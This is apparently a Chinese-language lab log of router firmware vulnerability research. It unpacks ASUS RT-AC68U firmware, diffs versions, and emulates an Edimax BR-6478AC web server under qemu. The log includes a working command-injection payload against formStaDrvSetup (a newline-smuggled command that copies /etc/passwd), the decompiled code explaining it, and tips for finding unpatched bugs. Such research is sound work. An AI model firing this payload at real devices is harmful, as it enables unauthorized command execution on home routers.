### A2 解包（trx → squashfs → rootfs）

```powershell
Expand-Archive -Path FW_RT-AC68U_300438652102.zip -DestinationPath extract -Force
Get-ChildItem extract -Recurse -File | Select-Object Name, @{n='MB';e={[math]::Round($_.Length/1MB,1)}}
```

```
Name                                          MB
----                                          --
RT-AC68U_3.0.0.4_386_52102-ga21b4c9.trx       102
```

找文件系统魔数：

```
HDR0 @ 0x0          ← trx 头
hsqs @ 0x19C5B0     ← squashfs 起点
```

切出 squashfs（按超级块里的 `bytes_used` 截断，否则 7z/unsquashfs 会报错）：

```python
data = open(TRX, "rb").read()
i = data.find(b"hsqs")
bytes_used = struct.unpack_from("<Q", data, i + 40)[0]   # offset 40 = bytes_used (u64 LE)
open(OUT, "wb").write(data[i:i + bytes_used])
```

```
hsqs @ 0x19c5b0
block_size=131072 inodes=2927 bytes_used=41.0 MB
切出 41 MB -> C:\deepseek\fw\asus\root.sqfs
```

> **解包一定要在 Linux 上做**。Windows 解 squashfs 会把符号链接变成 0 字节文件，
> 后面 `system()` 全变 `ENOEXEC`（案例 B 里踩过）。

### A5 版本差分（这轮唯一的新东西）

```bash
$ strings -a -n 6 asus_old/sbin/rc | sort -u > /tmp/old.txt
$ strings -a -n 6 asus_root/sbin/rc | sort -u > /tmp/new.txt
$ echo "旧 $(wc -l < /tmp/old.txt) / 新 $(wc -l < /tmp/new.txt)"
    旧 9721 / 新 9732

$ comm -13 /tmp/old.txt /tmp/new.txt | head -40     # 新版才有的
```

## 2. 案例 B：Edimax BR-6478AC（动态复现）

### B1 起机（六个坑，逐条）

```bash
# ① 字节序：webs 是 LSB MIPS，用 qemu-mips 会静默 exit 1
$ file root/bin/webs
ELF 32-bit LSB executable, MIPS, MIPS-II ... → 要用 qemu-mipsel

# ② 执行位：没有 +x 也是静默 exit 1
$ chmod -R a+rx root/bin root/sbin

# ③ -L 不够，必须 chroot（-L 只重定向加载器，不重定向 /etc/boa 这类路径）
$ qemu-mipsel-static -L root root/bin/webs
Could not chdir to "/etc/boa": aborting

# ④ /etc 要从 etc.tmp 铺
$ cp -a root/etc.tmp/. root/etc/

# ⑤ /dev 要补
$ mknod -m 666 root/dev/null c 1 3

# ⑥ NVRAM：把 etc/config.bin（开头是 HS02）喂成 MTD 分区
$ head -c 4 root/etc/config.bin
HS02
$ for b in 0 3 6 7; do cp root/etc/config.bin root/dev/mtdblock$b; chmod 666 root/dev/mtdblock$b; done
```

起机成功：

```
$ chroot root /bin/webs
boa: server version Boa/0.94.14rc21
boa: server built Apr  6 2022 at 16:11:50.
boa: starting server pid=9550, port 80
```

> 修好之前是 `Read hw setting header failed!` + `Initialize AP MIB failed!`，
> 之后**任何请求都 SIGSEGV**（包括 `GET /`）——那会把「环境崩」误当成「漏洞」。

### B2 命令注入复现

```bash
$ python -m fwmap dyn flow.json --m2 m2.json \
    --binary root/bin/webs --rootfs root --port 80 \
    --only formStaDrvSetup \
    --cmd "cp /etc/passwd /tmp/pwned" --check /tmp/pwned
```

```
对照组（无害 GET /）… no-crash
    formStaDrvSetup · rootAPmac=30B … exec-confirmed
    formStaDrvSetup · rootAPmac=64B … no-crash
[+] **命令执行确认 1 条** —— 注入的命令真的跑了
    载荷："x'\ncp /etc/passwd /tmp/pwned\n'"
    副产物：root:x:0:0:root:/root:/bin/sh
            dnrd:x:1:1:dnrd:/:/bin/sh
            bin:x:1:1:bin:/bin:
[+] 崩溃 0 条 · 未崩溃 6 条
```

为什么是这种载荷（反编译里看到的）：

```c
puVar10 = "echo '%s' > /tmp/apcli0_rootMAC";
sprintf(acStack_340, puVar10, pcVar9);
while (*pcVar14 != ';') pcVar14++;   /* 遇到分号就截断 */
*pcVar14 = '\0';
```

- 值被**单引号**包住 → 要用 `'` 闭合；
- 值在**第一个 `;` 处被截断** → 不能用分号，要用换行。

## 5. 如果重来一次

1. **解包只在 Linux 做** —— 省掉「符号链接丢失」那一整轮；
2. **先跑 `check`** —— 它现在会直接报「bin 下有 N 个 0 字节文件」；
3. **动态验证先跑对照组** —— 环境不健康时，后面的结论全是假的；
4. **新颖性核对先跑** —— 已公开的链不值得花时间验证；
5. **想找新东西，别从最新固件开始** —— 从**两个相邻版本的差分**开始，
   看厂商这一版在补什么，再找没补干净的兄弟点。
